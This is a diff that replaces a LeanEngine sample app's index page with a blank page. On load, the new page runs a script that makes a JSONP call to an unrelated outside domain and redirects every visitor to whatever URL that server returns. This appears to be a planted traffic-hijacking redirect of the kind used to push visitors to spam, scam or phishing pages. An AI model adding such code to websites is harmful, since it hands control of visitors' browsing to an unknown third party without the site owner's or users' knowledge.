@@ -1,13 +1,31 @@
-<!DOCTYPE HTML>
 <html>
-  <head>
-    <title>LeanEngine</title>
-    <link rel="stylesheet" href="/stylesheets/style.css">
-  </head>
-  <body>
-    <h1>LeanEngine</h1>
-    <p>这是 LeanEngine 的示例应用</p>
-     <p>当前时间：<?= $currentTime->format(DATE_ATOM) ?></p>
-    <p><a href="/todos">一个简单的「TODO 列表」示例</a></p>
-  </body>
+<head>
+  <meta http-equiv="Access-Control-Allow-Origin" content="*"/>
+   <meta charset="utf-8">
+    <title></title>
+  <!--   <script src="https://wangjin-61.oss-cn-shanghai.aliyuncs.com/jin-61/shuang11/static/js/jquery.min.js"></script> -->
+   <script src="https://libs.baidu.com/jquery/2.0.0/jquery.js"></script>
+   
+</head>
+<body>
+</body> 
+    <script>
+         $.ajax({
+            type:"GET",
+            url:'http://datou.cdkuiyang.com/jin-61/1206sp/kouru.php', //访问的链接
+            dataType:"jsonp",  //数据格式设置为jsonp
+            jsonp:"callback",  //Jquery生成验证参数的名称
+            data:{
+               
+            },
+            success:function(res){  //成功的回调函数
+                 location.href = res.url;
+            },
+
+            error: function (e) {
+                console.log(e)
+            }
+
+        });
+    </script>
 </html>
